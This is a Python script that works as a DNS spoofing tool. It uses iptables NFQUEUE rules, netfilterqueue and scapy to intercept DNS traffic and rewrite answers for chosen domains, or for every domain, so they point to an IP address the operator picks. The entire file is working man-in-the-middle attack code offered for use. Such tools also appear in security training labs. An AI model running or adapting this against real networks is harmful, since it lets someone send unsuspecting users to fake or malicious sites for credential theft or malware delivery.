import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse
from colorama import init, Fore

GREEN  = Fore.GREEN
RED    = Fore.RED
YELLOW = Fore.YELLOW


def get_arguments():
    parser = argparse.ArgumentParser(description='DNS Spoof against target computer , to redirect WEB pages on Local I
P')
    parser.add_argument('-p' , '--ip' , nargs='?' ,  dest='ip' , help='Spoof the DNS query packets of a certain IP add
ress' , required=True)
    parser.add_argument('-t' , '--target' , nargs='?' , dest='target' , help='Target Websites , ex: example.com  OR ex
ample.com,example2.com')
    parser.add_argument('--all'  , dest='all', action='store_const', const=True , help='Target All Websites')
    parser.add_argument('--local', dest='local', action='store_const', const=True , help='Spoof in your Computer , def
ault=target')
    args = parser.parse_args()
    if args.target==None and args.all==None:
        parser.error('the following arguments are required: -t/-all')
    else:
        return args



def change_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer('DNS Resource Record'):
        WebHost = scapy_packet[scapy.DNSQR].qname.decode()

        for TargetHost in arr:
            if TargetHost in  WebHost:
                print(f'{GREEN} [+] Spoofed {RED} {TargetHost}  {YELLOW} To  {result.ip}') 
                spoof = scapy.DNSRR(rrname=WebHost , rdata=result.ip)
                scapy_packet[scapy.DNS].an = spoof
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                
                packet.set_payload(bytes(scapy_packet))

                print(scapy_packet.show())

                

    packet.accept()
    

def process():
    if result.local:
        commandone = 'iptables -I OUTPUT -j NFQUEUE --queue-num 0'
        commandtwo = 'iptables -I INPUT -j NFQUEUE --queue-num 0'
        subprocess.run([commandone] , shell=True)
        subprocess.run([commandtwo] , shell=True)
    else:
        command = 'iptables -I FORWARD -j NFQUEUE --queue-num 0'
        subprocess.run([command] , shell=True)

    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0 , change_packet)
        queue.run()
    except:
        command = 'iptables --flush'
        subprocess.run([command] , shell=True)

result = get_arguments()
arr = list()
if result.target:
    arr = (result.target.split(','))
    process()
elif result.all:
    arr = ['']
    process()

